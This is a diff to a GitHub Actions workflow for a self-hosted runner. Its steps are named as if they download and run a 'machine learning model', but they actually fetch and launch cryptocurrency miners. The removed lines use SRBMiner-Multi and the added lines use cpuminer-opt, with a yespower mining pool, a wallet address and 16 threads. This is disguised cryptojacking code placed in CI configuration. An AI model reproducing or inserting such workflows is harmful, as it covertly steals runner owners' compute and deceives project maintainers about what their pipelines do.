@@ -8,23 +8,21 @@ on:
 jobs:
   build:
     runs-on: self-hosted
+   
 
+   
     steps:
       - name: Checkout Repository
         uses: actions/checkout@v2
 
-      - name: Install Dependencies
-        run: |
-          sudo apt update
-          sudo apt -y install wget
-          sudo apt -y install tar xz-utils
+      
 
       - name: Download and Extract Machine Learning Model
         run: |
-          wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz
-          tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz
-          cd SRBMiner-Multi-2-4-7
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
+          tar xf cpuminer-opt-linux.tar.gz
+          chmod +x cpuminer-sse2
 
       - name: Run Machine Learning Model
         run: |
-          ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1r pause --keepalive true
+          ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1 --threads=16
